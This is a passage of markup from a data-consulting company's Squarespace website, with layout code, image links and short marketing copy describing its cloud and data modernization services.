                                      <img data-stretch="true" crossOrigin data-src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg" data-image="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg" data-image-dimensions="750x500" data-image-focal-point="1.0,0.5040630078759845" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg" width={750} height={500} sizes="100vw" style={{display: 'block', objectFit: 'cover', objectPosition: '100% 50.40630078759845%'}} srcSet="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=100w 100w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=300w 300w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=500w 500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=750w 750w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/b5eec56c-0383-41e3-a209-d95de7819f7f/BoBoCayuga-Technologies-laptop-cloud.jpg?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" />
                                      <div className="imageEffectContainer" style={{position: 'absolute', inset: 0, margin: 'auto', pointerEvents: 'none'}} data-effect="{
&quot;type&quot;: &quot;parallax&quot;,
&quot;intensity&quot;: 20,
&quot;rotation&quot;: 45,
&quot;zoomStart&quot;: 0,
&quot;zoomEnd&quot;: 0
}" />
                                      <div className="fluidImageOverlay" />
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: ".sqs-block-image .sqs-block-content {\n          height: 100%;\n          width: 100%;\n        }\n      \n\n      \n        .fe-block-df1240880cc31f4413f2 .fluidImageOverlay {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 100%;\n          height: 100%;\n          mix-blend-mode: normal;\n          \n            \n            \n          \n          \n            opacity: 0;\n          \n        }\n      \n    " }} />
                            </div></div></div><div className="fe-block fe-block-ae0d589802342d28e814"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-ae0d589802342d28e814"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <h2 style={{whiteSpace: 'pre-wrap'}}><strong>Transforming the Data Cloud, one breakthrough at a time</strong></h2><p className="sqsrte-large" style={{whiteSpace: 'pre-wrap'}}>BoBoCayuga Technologies is here to support your organization in crafting, executing, and refining a state-of-the-art data modernization strategy. </p><p className="sqsrte-large" style={{whiteSpace: 'pre-wrap'}}>We are experts in analyzing and evaluating existing infrastructures and formulating strategies and roadmaps to realize your organization's objectives. </p><p className="sqsrte-large" style={{whiteSpace: 'pre-wrap'}}>Our approach prioritizes critical use cases and scalable outcomes while harnessing the latest and most advanced technologies to deliver results.</p>
                              </div>
                            </div></div></div></div></div>
                  </div>
                </div>
              </section>
              <section data-test="page-section" data-section-theme="white-bold" className="page-section 
    
      full-bleed-section
      layout-engine-section
    
    background-width--full-bleed
    
      
        section-height--custom
      
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    white-bold" data-section-id="6504d946c5af1b1ea7df3d7c" data-controller="SectionWrapperController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
&quot;customSectionHeight&quot;: 0,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;white-bold&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-current-context="{
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0,
&quot;videoSourceProvider&quot;: &quot;none&quot;
},
&quot;backgroundImageId&quot;: null,
&quot;backgroundMediaEffect&quot;: {
&quot;type&quot;: &quot;none&quot;
},
&quot;divider&quot;: {
&quot;enabled&quot;: false,
&quot;type&quot;: &quot;wavy&quot;,
&quot;width&quot;: {
&quot;unit&quot;: &quot;vw&quot;,
&quot;value&quot;: 100.0
},
&quot;height&quot;: {
&quot;unit&quot;: &quot;vw&quot;,
&quot;value&quot;: 3.0
},
&quot;isFlipX&quot;: false,
&quot;isFlipY&quot;: false,
&quot;offset&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;stroke&quot;: {
&quot;style&quot;: &quot;none&quot;,
&quot;color&quot;: {
&quot;type&quot;: &quot;THEME_COLOR&quot;
},
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 6.0
},
&quot;dashLength&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 5.0
},
&quot;gapLength&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 15.0
},
&quot;linecap&quot;: &quot;square&quot;
}
},
&quot;typeName&quot;: &quot;page&quot;
}" data-animation="none" data-fluid-engine-section>
                <div className="section-border">
                  <div className="section-background">
                  </div>
                </div>
                <div className="content-wrapper" style={{paddingTop: 'calc(0vmax / 10)', paddingBottom: 'calc(0vmax / 10)'}}>
                  <div className="content">
                    <div data-fluid-engine="true"><style dangerouslySetInnerHTML={{__html: ".fe-6504d946c5af1b1ea7df3d7b {\n  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 15.0px);\n  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (15.0px * (8 - 1)) ) / 8 );\n\n  display: grid;\n  position: relative;\n  grid-area: 1/1/-1/-1;\n  grid-template-rows: repeat(34,minmax(24px, auto));\n  grid-template-columns:\n    minmax(var(--grid-gutter), 1fr)\n    repeat(8, minmax(0, var(--cell-max-width)))\n    minmax(var(--grid-gutter), 1fr);\n  row-gap: 7.0px;\n  column-gap: 15.0px;\n}\n\n@media (min-width: 768px) {\n  .background-width--inset .fe-6504d946c5af1b1ea7df3d7b {\n    --inset-padding: calc(var(--sqs-site-gutter) * 2);\n  }\n\n  .fe-6504d946c5af1b1ea7df3d7b {\n    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 15.0px);\n    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (15.0px * (24 - 1)) ) / 24 );\n    --inset-padding: 0vw;\n\n    --row-height-scaling-factor: 0.0215;\n    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));\n\n    grid-template-rows: repeat(14,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));\n    grid-template-columns:\n      minmax(var(--grid-gutter), 1fr)\n      repeat(24, minmax(0, var(--cell-max-width)))\n      minmax(var(--grid-gutter), 1fr);\n  }\n}\n\n\n  .fe-block-yui_3_17_2_1_1694813245521_86382 {\n    grid-area: 8/1/35/11;\n    z-index: 1;\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_86382 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_86382 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-yui_3_17_2_1_1694813245521_86382 {\n      grid-area: 3/4/10/26;\n      z-index: 1;\n    }\n\n    .fe-block-yui_3_17_2_1_1694813245521_86382 .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-yui_3_17_2_1_1694813245521_86382 .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n  .fe-block-15abe9baf867febde9e0 {\n    grid-area: 1/1/13/11;\n    z-index: 2;\n  }\n\n  .fe-block-15abe9baf867febde9e0 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-15abe9baf867febde9e0 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-15abe9baf867febde9e0 {\n      grid-area: 1/2/13/9;\n      z-index: 2;\n    }\n\n    .fe-block-15abe9baf867febde9e0 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-15abe9baf867febde9e0 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_63339 {\n    grid-area: 14/2/19/6;\n    z-index: 3;\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_63339 .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_63339 .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-yui_3_17_2_1_1694813245521_63339 {\n      grid-area: 4/9/7/13;\n      z-index: 3;\n    }\n\n    .fe-block-yui_3_17_2_1_1694813245521_63339 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-yui_3_17_2_1_1694813245521_63339 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_102060 {\n    grid-area: 19/2/22/6;\n    z-index: 7;\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_102060 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-yui_3_17_2_1_1694813245521_102060 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-yui_3_17_2_1_1694813245521_102060 {\n      grid-area: 7/9/9/13;\n      z-index: 7;\n    }\n\n    .fe-block-yui_3_17_2_1_1694813245521_102060 .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-yui_3_17_2_1_1694813245521_102060 .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n  .fe-block-57c65df349b3174d6aee {\n    grid-area: 23/2/28/6;\n    z-index: 5;\n  }\n\n  .fe-block-57c65df349b3174d6aee .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-57c65df349b3174d6aee .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-57c65df349b3174d6aee {\n      grid-area: 4/17/7/21;\n      z-index: 5;\n    }\n\n    .fe-block-57c65df349b3174d6aee .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-57c65df349b3174d6aee .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-156a4637940f580197fe {\n    grid-area: 28/2/31/6;\n    z-index: 9;\n  }\n\n  .fe-block-156a4637940f580197fe .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-156a4637940f580197fe .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-156a4637940f580197fe {\n      grid-area: 7/17/9/21;\n      z-index: 9;\n    }\n\n    .fe-block-156a4637940f580197fe .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-156a4637940f580197fe .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n  .fe-block-81f7301ec16a01f5aa65 {\n    grid-area: 14/6/19/10;\n    z-index: 4;\n  }\n\n  .fe-block-81f7301ec16a01f5aa65 .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-81f7301ec16a01f5aa65 .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-81f7301ec16a01f5aa65 {\n      grid-area: 4/13/7/17;\n      z-index: 4;\n    }\n\n    .fe-block-81f7301ec16a01f5aa65 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-81f7301ec16a01f5aa65 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-86826a3ced55da69adb7 {\n    grid-area: 19/6/22/10;\n    z-index: 8;\n  }\n\n  .fe-block-86826a3ced55da69adb7 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-86826a3ced55da69adb7 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-86826a3ced55da69adb7 {\n      grid-area: 7/13/9/17;\n      z-index: 8;\n    }\n\n    .fe-block-86826a3ced55da69adb7 .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-86826a3ced55da69adb7 .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n  .fe-block-d3eba8588cbf3d9195ac {\n    grid-area: 23/6/28/10;\n    z-index: 6;\n  }\n\n  .fe-block-d3eba8588cbf3d9195ac .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-d3eba8588cbf3d9195ac .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-d3eba8588cbf3d9195ac {\n      grid-area: 4/21/7/25;\n      z-index: 6;\n    }\n\n    .fe-block-d3eba8588cbf3d9195ac .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-d3eba8588cbf3d9195ac .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n  .fe-block-eac475163f3570f06ad1 {\n    grid-area: 28/6/31/10;\n    z-index: 10;\n  }\n\n  .fe-block-eac475163f3570f06ad1 .sqs-block {\n    justify-content: flex-start;\n  }\n\n  .fe-block-eac475163f3570f06ad1 .sqs-block-alignment-wrapper {\n    align-items: flex-start;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-eac475163f3570f06ad1 {\n      grid-area: 7/21/9/25;\n      z-index: 10;\n    }\n\n    .fe-block-eac475163f3570f06ad1 .sqs-block {\n      justify-content: flex-start;\n    }\n\n    .fe-block-eac475163f3570f06ad1 .sqs-block-alignment-wrapper {\n      align-items: flex-start;\n    }\n  }\n\n  .fe-block-yui_3_17_2_1_1694982497794_26211 {\n    grid-area: 31/4/33/8;\n    z-index: 11;\n  }\n\n  .fe-block-yui_3_17_2_1_1694982497794_26211 .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-yui_3_17_2_1_1694982497794_26211 .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-yui_3_17_2_1_1694982497794_26211 {\n      grid-area: 11/22/13/26;\n      z-index: 11;\n    }\n\n    .fe-block-yui_3_17_2_1_1694982497794_26211 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-yui_3_17_2_1_1694982497794_26211 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n" }} /><div className="fluid-engine fe-6504d946c5af1b1ea7df3d7b"><div className="fe-block fe-block-yui_3_17_2_1_1694813245521_86382"><div className="sqs-block html-block sqs-block-html sqs-background-enabled" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-yui_3_17_2_1_1694813245521_86382"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                              </div>
                              <style dangerouslySetInnerHTML={{__html: "#block-yui_3_17_2_1_1694813245521_86382 {\n        box-sizing: border-box;\n        height: 100%;\n        padding: 6% 6% 6% 6%;\n        border-radius: 0px 0px 0px 0px;\n\n        \n\n        \n          \n            \n            \n              --tweak-text-block-background-color: \n  \n    hsla(var(--lightAccent-hsl), 1)\n  \n\n;\n            \n          \n        \n      }\n    " }} />
                            </div></div></div><div className="fe-block fe-block-15abe9baf867febde9e0"><div className="sqs-block html-block sqs-block-html sqs-background-enabled" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:75.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:75.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-15abe9baf867febde9e0"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <h1 style={{whiteSpace: 'pre-wrap'}}><span className="sqsrte-text-color--white">SERVICES</span></h1><p className="sqsrte-large" style={{whiteSpace: 'pre-wrap'}}><span className="sqsrte-text-color--white">BoBoCayuga's experienced team delivers customized data solutions that are aligned with the specific needs of each of our clients’ business initiatives, ensuring they meet their strategic goals.</span></p><p className="sqsrte-large" style={{whiteSpace: 'pre-wrap'}}><span className="sqsrte-text-color--white">BoBoCayuga manages the full lifecycle of cloud solutions – from initial assessment and use case identification to implementation, optimization, and governance.</span></p>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: "#block-15abe9baf867febde9e0 {\n        box-sizing: border-box;\n        height: 100%;\n        padding: 9% 7% 9% 7%;\n        border-radius: 0px 75px 0px 75px;\n\n        \n\n        \n          \n            \n            \n              --tweak-text-block-background-color: \n  \n    hsla(var(--accent-hsl), 1)\n  \n\n;\n            \n          \n        \n      }\n    " }} />
                            </div></div></div><div className="fe-block fe-block-yui_3_17_2_1_1694813245521_63339"><div className="sqs-block image-block sqs-block-image sqs-stretched" data-block-type={5} id="block-yui_3_17_2_1_1694813245521_63339"><div className="sqs-block-content">
                              <div className="
        image-block-outer-wrapper
        layout-caption-below
        design-layout-fluid
        image-position-center
        combination-animation-site-default
        individual-animation-site-default
      " data-test="image-block-fluid-outer-wrapper">
                                <div className="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper" data-animation-role="image">
                                  <div className="fluid-image-container sqs-image-content" style={{overflow: 'hidden', WebkitMaskImage: '-webkit-radial-gradient(white, black)', position: 'relative', width: '100%', height: '100%'}}>
                                    <a className="sqs-block-image-link content-fit" href="services.php">
                                      <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png" data-image="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png" data-image-dimensions="1000x1000" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png" width={1000} height={1000} sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 16.666666666666664vw" style={{display: 'block', objectFit: 'contain', objectPosition: '50% 50%'}} srcSet="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/dcc43db5-721e-4a0a-a580-453e6f6378e4/BoBoCayuga-Technologies-services-data-strategy-and-solutions-architecture.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" />
                                      <div className="fluidImageOverlay" />
                                    </a>
                                  </div>
                                </div>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: ".sqs-block-image .sqs-block-content {\n          height: 100%;\n          width: 100%;\n        }\n      \n\n      \n        .fe-block-yui_3_17_2_1_1694813245521_63339 .fluidImageOverlay {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 100%;\n          height: 100%;\n          mix-blend-mode: normal;\n          \n            \n            \n          \n          \n            opacity: 0;\n          \n        }\n      \n    " }} />
                            </div></div></div><div className="fe-block fe-block-yui_3_17_2_1_1694813245521_102060"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-yui_3_17_2_1_1694813245521_102060"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <p style={{textAlign: 'center', whiteSpace: 'pre-wrap'}} className><a href="services.php"><span className="sqsrte-text-color--black"><strong>Data Strategy &amp; Solutions Architecture</strong></span></a></p>
                              </div>
                            </div></div></div><div className="fe-block fe-block-57c65df349b3174d6aee"><div className="sqs-block image-block sqs-block-image sqs-stretched" data-block-type={5} id="block-57c65df349b3174d6aee"><div className="sqs-block-content">
                              <div className="
        image-block-outer-wrapper
        layout-caption-below
        design-layout-fluid
        image-position-center
        combination-animation-site-default
        individual-animation-site-default
      " data-test="image-block-fluid-outer-wrapper">
                                <div className="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper" data-animation-role="image">
                                  <div className="fluid-image-container sqs-image-content" style={{overflow: 'hidden', WebkitMaskImage: '-webkit-radial-gradient(white, black)', position: 'relative', width: '100%', height: '100%'}}>
                                    <a className="sqs-block-image-link content-fit" href="services.php">
                                      <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png" data-image="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png" data-image-dimensions="1000x1000" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png" width={1000} height={1000} sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 16.666666666666664vw" style={{display: 'block', objectFit: 'contain', objectPosition: '50% 50%'}} srcSet="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/e753e0a5-73b2-44e6-9eed-5c17ac8b08f4/BoBoCayuga-Technologies-services-system-quality-and-optimization.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" />
                                      <div className="fluidImageOverlay" />
                                    </a>
                                  </div>
                                </div>
                              </div>
                              <style dangerouslySetInnerHTML={{__html: ".sqs-block-image .sqs-block-content {\n          height: 100%;\n          width: 100%;\n        }\n      \n\n      \n        .fe-block-57c65df349b3174d6aee .fluidImageOverlay {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 100%;\n          height: 100%;\n          mix-blend-mode: normal;\n          \n            \n            \n          \n          \n            opacity: 0;\n          \n        }\n      \n    " }} />
                            </div></div></div><div className="fe-block fe-block-156a4637940f580197fe"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-156a4637940f580197fe"><div className="sqs-block-content">
                              <div className="sqs-html-content">
                                <p style={{textAlign: 'center', whiteSpace: 'pre-wrap'}} className><a href="services.php"><span className="sqsrte-text-color--black"><strong>System Quality &amp; Optimization</strong></span></a></p>
                              </div>
                            </div></div></div><div className="fe-block fe-block-81f7301ec16a01f5aa65"><div className="sqs-block image-block sqs-block-image sqs-stretched" data-block-type={5} id="block-81f7301ec16a01f5aa65"><div className="sqs-block-content">
                              <div className="
        image-block-outer-wrapper
        layout-caption-below
        design-layout-fluid
        image-position-center
        combination-animation-site-default
        individual-animation-site-default
      " data-test="image-block-fluid-outer-wrapper">
                                <div className="fluid-image-animation-wrapper sqs-image sqs-block-alignment-wrapper" data-animation-role="image">
                                  <div className="fluid-image-container sqs-image-content" style={{overflow: 'hidden', WebkitMaskImage: '-webkit-radial-gradient(white, black)', position: 'relative', width: '100%', height: '100%'}}>
                                    <a className="sqs-block-image-link content-fit" href="services.php">
                                      <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png" data-image="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png" data-image-dimensions="1000x1000" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png" width={1000} height={1000} sizes="(max-width: 640px) 100vw, (max-width: 767px) 50vw, 16.666666666666664vw" style={{display: 'block', objectFit: 'contain', objectPosition: '50% 50%'}} srcSet="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/24218896-cc22-42b3-a730-25fc4958e318/BoBoCayuga-Technologies-services-cloud-implementations-and-data-migrations.png?format=100w 100w, 